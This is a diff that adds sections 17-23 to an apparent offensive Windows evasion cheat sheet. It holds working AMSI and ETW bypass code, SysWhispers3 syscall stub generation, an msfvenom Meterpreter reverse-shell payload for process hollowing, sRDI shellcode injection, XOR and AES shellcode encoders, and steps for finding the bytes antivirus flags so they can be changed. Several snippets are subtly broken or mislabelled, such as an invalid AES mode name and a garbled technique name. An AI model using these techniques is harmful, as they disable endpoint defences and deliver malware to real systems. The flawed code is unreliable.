@@ -819,3 +819,300 @@ if ($diff.TotalMinutes -lt 10) {
     exit
 }
 ```
+
+---
+
+## 17. AMSI Bypass Techniques (Advanced)
+
+### AMSI Bypass via CLR Hooking
+
+```powershell
+# AMSI bypass by modifying the CLR's AmsiScan function pointer
+# Forces all AMSI scans to return AMSI_RESULT_CLEAN
+$amsi = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
+$utils = $amsi.GetType('System.Management.Automation.AmsiUtils')
+$field = $utils.GetField('amsiInitFailed', 'NonPublic,Static')
+$field.SetValue($null, $true)
+
+# Verify bypass succeeded
+Write-Host "AMSI bypass applied - amsiInitFailed set to true"
+```
+
+### AMSI Bypass via Hardware Breakpoints
+
+```bash
+# Use hardware breakpoints to intercept AmsiScanBuffer calls
+# Tools: SharpBreakpoint, BpAmsi
+# Concept: set DR0 register to AmsiScanBuffer address with execute breakpoint
+# When breakpoint fires, redirect execution to a stub that returns clean
+
+# Check AMSI status before and after bypass
+powershell -c "[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation') | Out-Null; [System.Management.Automation.AmsiUtils]::amsiInitFailed"
+```
+
+---
+
+## 18. ETW Patching
+
+### Disable ETW Telemetry
+
+```powershell
+# Patch EtwEventWrite to return immediately (prevents telemetry logging)
+# This stops EDR agents from receiving event telemetry via ETW
+$etwAssembly = [System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Tracing')
+$addr = [System.Diagnostics.Tracing.EventProvider]::GetGuid
+Write-Host "ETW provider identified"
+
+# C# implementation for ETW patching
+```
+
+```csharp
+// ETW patch: replace EtwEventWrite prologue with ret instruction
+using System;
+using System.Runtime.InteropServices;
+
+public class EtwPatcher
+{
+    [DllImport("kernel32")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
+
+    public static void PatchEtw()
+    {
+        IntPtr ntdll = LoadLibrary("ntdll.dll");
+        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
+        uint oldProtect;
+        VirtualProtect(etwAddr, (UIntPtr)4, 0x40, out oldProtect);
+        // Write: ret (0xC3) to skip ETW logging
+        Marshal.Copy(new byte[] { 0xC3 }, 0, etwAddr, 1);
+        VirtualProtect(etwAddr, (UIntPtr)4, oldProtect, out oldProtect);
+    }
+}
+```
+
+---
+
+## 19. Direct Syscall Execution (Advanced)
+
+### Hell's Gate Dynamic Syscall Resolution
+
+```bash
+# Hell's Gate technique: resolve SSNs dynamically from ntdll in memory
+# Avoids static analysis of hardcoded syscall numbers
+# Tools: SysWhispers3, HalosGate, TartarusGate
+
+# Generate syswhispers3 stubs with Hale's Gate fallback
+syswhispers3 --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx \
+  --hells-gate --o syscalls_hg
+
+# Generate with indirect syscalls (more evasion)
+syswhispers3 --functions NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx \
+  --indirect --o syscalls_indirect
+
+# Build with generated stubs
+# gcc -o loader loader.c syscalls_indirect.c -lntdll
+```
+
+### Indirect Syscall Pattern
+
+```c
+// Indirect syscall: jump to ntdll syscall instruction address
+// Resolves SSN at runtime, then jumps to ntdll's syscall;ret instruction
+// This avoids suspicious call patterns that go directly to kernel
+#include <windows.h>
+
+// Resolved at runtime from ntdll.dll
+DWORD ssn_NtAllocateVirtualMemory = 0;
+FARPROC addr_syscall_instruction = NULL;
+
+// Call via indirect jump (appears as legitimate ntdll call)
+NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+```
+
+---
+
+## 20. Process Hollowing Variants
+
+### Classic Process Hollowing
+
+```bash
+# Process hollowing: create suspended process, unmap, inject, resume
+# Step 1: Create suspended legitimate process
+# Step 2: Unmap its memory (NtUnmapViewOfSection)
+# Step 3: Allocate memory and write malicious payload
+# Step 4: Update entry point and resume thread
+
+# Generate shellcode for injection
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o hollow.bin
+
+# Use hollowing tool (e.g., HollowHunter, custom loader)
+# Common target processes: svchost.exe, explorer.exe, notepad.exe
+```
+
+### Process Doppelganging
+
+```bash
+# Process Doppelganging: uses NTFS transactions to avoid file-based detection
+# 1. Create NTFS transaction
+# 2. Write payload to transaction (invisible to AV file scans)
+# 3. Create process from transaction
+# 4. Rollback transaction (file never existed on disk)
+# Tools: ProcessDoppelganging POC, custom implementations
+
+# Check for transaction support on target
+powershell -c "fsutil transaction list"
+```
+
+---
+
+## 21. Reflective DLL Injection (Advanced)
+
+### sRDI - Shellcode Reverse DLL Injection
+
+```bash
+# Convert DLL to position-independent shellcode using sRDI
+python3 sRDI.py payload.dll -f raw -o payload_shellcode.bin
+
+# Convert with export function specification
+python3 sRDI.py payload.dll -f raw -e EntryPoint -o payload.bin
+
+# Inject shellcode into remote process
+# Use inject.py from sRDI toolkit
+python3 inject.py -p notepad.exe -i payload_shellcode.bin
+```
+
+### Memory Module Loading (C#)
+
+```csharp
+// Load DLL from memory without LoadLibrary (avoids disk writes)
+// Uses ManualMap technique to resolve imports in-memory
+using System;
+using System.Runtime.InteropServices;
+
+public class MemoryLoader
+{
+    // Allocate RWX memory, copy DLL bytes, resolve imports, call DllMain
+    // This avoids calling LoadLibrary which is monitored by EDR
+    public static IntPtr LoadFromMemory(byte[] dllBytes)
+    {
+        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)dllBytes.Length,
+            0x3000, 0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        Marshal.Copy(dllBytes, 0, baseAddr, dllBytes.Length);
+        // Parse PE headers, resolve imports, apply relocations
+        // Call DllMain with DLL_PROCESS_ATTACH
+        return baseAddr;
+    }
+
+    [DllImport("kernel32")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
+        uint flAllocationType, uint flProtect);
+}
+```
+
+---
+
+## 22. Shellcode Encoding and Encryption
+
+### Custom XOR Encoder
+
+```python
+#!/usr/bin/env python3
+"""Custom XOR encoder with key scheduling for shellcode obfuscation."""
+import sys
+
+def xor_encode(shellcode: bytes, key: bytes) -> bytes:
+    """Encode shellcode with multi-byte XOR key and key rotation."""
+    encoded = bytearray()
+    key_len = len(key)
+    for i, b in enumerate(shellcode):
+        k = key[i % key_len]
+        # Rotate key byte based on position
+        rotated_k = ((k + i) & 0xFF) ^ (i & 0xFF)
+        encoded.append(b ^ rotated_k)
+    return bytes(encoded)
+
+# Read raw shellcode
+with open('shellcode.bin', 'rb') as f:
+    sc = f.read()
+
+key = b'\x4A\x7B\x3C\x9D\xE2'
+encoded = xor_encode(sc, key)
+
+# Prepend decoder stub header (placeholder - stub must be built separately)
+with open('encoded_shellcode.bin', 'wb') as f:
+    f.write(encoded)
+
+print(f'Encoded {len(sc)} bytes with {len(key)}-byte rotating XOR key')
+```
+
+### AES-Encrypted Shellcode Loader
+
+```python
+#!/usr/bin/env python3
+"""AES-encrypt shellcode for runtime decryption to evade static detection."""
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
+
+# Read shellcode
+with open('shellcode.bin', 'rb') as f:
+    shellcode = f.read()
+
+# Generate random key and IV
+key = os.urandom(32)  # AES-256
+iv = os.urandom(16)
+
+# Encrypt
+cipher = AES.new(key, AES_CBC, iv)
+encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
+
+# Save encrypted shellcode and key
+with open('encrypted_sc.bin', 'wb') as f:
+    f.write(iv + encrypted)
+
+with open('key.bin', 'wb') as f:
+    f.write(key)
+
+print(f'AES-256-CBC encrypted {len(shellcode)} bytes -> {len(encrypted)} bytes')
+print(f'Key: {key.hex()}')
+print(f'IV:  {iv.hex()}')
+```
+
+---
+
+## 23. Evasion Testing Frameworks
+
+### ThreatCheck - Identify Detection Signatures
+
+```bash
+# ThreatCheck identifies which bytes of a payload trigger AV detection
+# Install: https://github.com/rasta-mouse/ThreatCheck
+
+# Scan payload against Windows Defender
+ThreatCheck.exe -f payload.exe -e defender
+
+# Scan against specific engine
+ThreatCheck.exe -f payload.exe -e amsi
+
+# Output shows exact offset where detection triggers
+# Split payload and re-test to isolate signature
+```
+
+### DefenderCheck - Minimal Detection Testing
+
+```bash
+# DefenderCheck finds minimal payload that triggers detection
+# Useful for understanding exactly what signatures to avoid
+
+# Test file against Defender
+DefenderCheck.exe payload.exe
+
+# The tool iteratively removes bytes and re-tests
+# Final output: the smallest byte sequence that triggers detection
+# Use this to identify which strings/patterns need modification
+```
